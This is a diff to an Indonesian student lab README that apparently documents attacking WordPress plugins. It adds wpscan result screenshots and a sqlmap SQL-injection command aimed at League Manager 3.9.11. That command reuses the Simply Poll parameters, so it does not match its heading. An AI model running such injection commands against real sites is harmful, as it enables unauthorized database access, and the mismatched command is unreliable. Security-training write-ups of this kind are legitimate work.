@@ -81,6 +81,11 @@ ruby wpscan.rb --url alamat_site  --enumerate vp
 ![hasil 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscanrun1.png)
 ![hasil 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscanresult1.png)
 ![hasil 3](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%202.png)
+![hasil 4](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%203.png)
+![hasil 5](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%204.png)
+![hasil 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%205.png)
+![hasil 7](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%206.png)
+![hasil 8](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%207.png)
 
 ### sqlmap
 
@@ -105,6 +110,11 @@ python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=sp
 
 ![simplypol 9](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll9.png)
 ![simplypol 10](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll10.png)
+
+#### Plugin - League Manager 3.9.11
+- Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
+python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=spAjaxResult&&pollid=iddaripoll" --dbms=mysql --level=5 --risk=3
+</pre>
 
 ## Kesimpulan dan Saran
 
